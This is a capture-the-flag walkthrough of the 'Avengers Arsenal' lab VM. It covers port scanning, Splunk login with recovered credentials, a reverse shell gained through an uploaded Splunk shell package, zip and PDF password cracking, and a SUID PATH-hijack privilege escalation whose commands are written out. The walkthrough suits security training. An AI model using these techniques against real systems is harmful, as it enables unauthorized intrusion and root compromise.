@@ -1,0 +1,193 @@
+Avengers Arsenal 
+
+The ip is 192.168.57.212
+
+Doing nmap, we get nmap -A -p- ip
+
+Nmap scan report for 192.168.57.212
+Host is up (0.0014s latency).
+Not shown: 65531 closed ports
+PORT     STATE SERVICE         VERSION
+80/tcp   open  http            Apache httpd 2.4.29 ((Ubuntu))
+| http-git: 
+|   192.168.57.212:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|     Remotes:
+|_      https://github.com/Ignitetechnologies/Web-Application-Cheatsheet.git
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+| http-robots.txt: 1 disallowed entry 
+|_/groot
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Avengers Arsenal
+8000/tcp open  http            Splunkd httpd
+|_http-favicon: Unknown favicon MD5: E60C968E8FF3CC2F4FB869588E83AFC6
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Splunkd
+| http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_Requested resource was http://192.168.57.212:8000/en-US/account/login?return_to=%2Fen-US%2F
+8089/tcp open  ssl/http        Splunkd httpd
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Splunkd
+|_http-title: splunkd
+| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
+| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2019-09-16T14:51:44
+| Not valid after:  2022-09-15T14:51:44
+| MD5:   e130 be2e ce68 03d5 d8c8 77aa 67f4 9e8a
+|_SHA-1: 8b38 3723 0eda 12fd 4fe2 2c3f 11c8 53d4 409f 2d9a
+8191/tcp open  limnerpressure?
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest: 
+|     HTTP/1.0 200 OK
+|     Connection: close
+|     Content-Type: text/plain
+|     Content-Length: 85
+|_    looks like you are trying to access MongoDB over HTTP on the native driver port.
+
+
+
++ OSVDB-3268: /groot/: Directory indexing found.
++ Entry '/groot/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 1 entry which should be manually viewed.
++ IP address found in the 'location' header. The IP is "127.0.1.1".
++ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
++ Server may leak inodes via ETags, header found with file /, inode: 1bfd, size: 592cf9f3e8286, mtime: gzip
++ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
++ OSVDB-3268: /css/: Directory indexing found.
++ OSVDB-3092: /css/: This might be interesting...
++ OSVDB-3268: /images/: Directory indexing found.
+
+
+okay in robot.txt we found /groot 
+
+and got a zip file 
+
+hammer.zip
+
+In the source code , in the Yaka Arrow section 
+and in enumerating more 
+we found a ravagers html 
+
+where we found a credentials in hex 
+
+agent:avengers
+
+
+
+
+We could log into the splunk page 
+
+On logging in we found the splunk dashboard 
+
+searching the net we found a splunk shell 
+
+and ways to upload it 
+
+
+So what we found was 
+there is a set of tools called splunk.tar.gz (containing shells)
+
+Uploading and following the procedure , we were able to get the reverse shell on our netcat 
+
+However , no tty was generated 
+
+So we created another payload from msfvenom for unix_cmd and paste it in the netcat connection 
+and we get a new netcat connection 
+
+It runs and we are able to execute the python bash mantra 
+
+and we get bash shell
+
+Lets continue !!!!!!!!!!!!!!!!!
+
+BACK TO THE HAMMER.ZIP
+---------------------------------
+Now in the avenegers book source code we get a hint to use Stark info 
+
+We use a tool called cupp and fill with info of tony stark from the page .
+
+we then used zip2john to get hash of zip 
+
+And we ran john --wordlist=tony.txt hammerhash.txt
+
+we got mjolnir.pdf but it is locked too
+
+SO we search for pdf2john and find a whole directory of ctftools
+
+The password for zip was Stark12008 and for pdf is Tony_050081
+
+We got our first flag = Mjølnir:{4A3232C59ECDA21AC71BEBE3B329BF36}
+
+We got to check the .git and check in every file and we got it 
+in the commit part 
+It was in base64 , so we convert and we got the shield
+
+Captain America's Shield:{061786D9A8BB89A2FE745DD26FE2E13C}
+
+So we get the reverse shell on splunk and we look into /var/www/html 
+
+and we got the scepter.txt 
+The file contained nothing but space . SO we use the spammimic decoder amd 
+we got the flag 
+
+Scepter:{469F1394A349DCF8A742653CE093FA80}
+
+One flag left 
+
+**************PRIVILEGE ESCALATION******************************
+
+find / -perm -4000 -type f 2>/dev/null
+
+Shows which commands have suid 
+
+/opt/ignite 
+
+we saw running ignite it works same as ifconfig , so ignite was probably calling ifconfig
+
+So going in the temp folder 
+
+we , 
+echo "/bin/bash">ifconfig
+chmod 777 ifconfig
+
+echo $PATH
+export PATH=.:$PATH
+echo $PATH
+
+/opt/ignite 
+
+We got root !!!!!!!!!!!!!!!!!!!!!!!!
+
+And in root dir we got 
+THE 
+
+
+ █████╗ ██████╗ ███████╗███████╗███╗   ██╗ █████╗ ██╗     
+██╔══██╗██╔══██╗██╔════╝██╔════╝████╗  ██║██╔══██╗██║     
+███████║██████╔╝███████╗█████╗  ██╔██╗ ██║███████║██║     
+██╔══██║██╔══██╗╚════██║██╔══╝  ██║╚██╗██║██╔══██║██║     
+██║  ██║██║  ██║███████║███████╗██║ ╚████║██║  ██║███████╗
+╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
+                                                          
+Storm Breaker:{0C683E44D2F04C6F62B99E87A38CF9CC}    
+
+
+-----------Contact Undersigned to share your feedback with HACKING ARTICLES Team-------------
+
+https://www.linkedin.com/in/aarti-singh-353698114/
+https://twitter.com/pavan2318
+https://twitter.com/rajchandel
+
+
